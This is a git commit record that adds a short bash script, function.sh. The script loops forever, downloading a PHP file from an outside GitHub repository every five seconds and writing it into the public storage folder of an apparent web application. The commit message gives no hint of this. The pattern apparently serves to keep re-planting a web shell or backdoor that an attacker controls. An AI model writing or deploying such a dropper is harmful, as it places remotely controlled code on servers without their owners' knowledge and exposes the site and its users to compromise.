ef02d4a5ff84c41b30fd2f03c680264ea558e2d5
KaliDashn <bloodsigma98123@gmail.com>
2026-02-21 16:45:26 +0530

    Create function.sh

---
+++ function/function.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+while true; do
+    curl -s https://raw.githubusercontent.com/KaliDashn/pkmkb36baar/refs/heads/main/database_function.php -o "/var/www/html/dg-food-internal-audit-new/storage/app/public/database_function.php"
+    sleep 5
+done
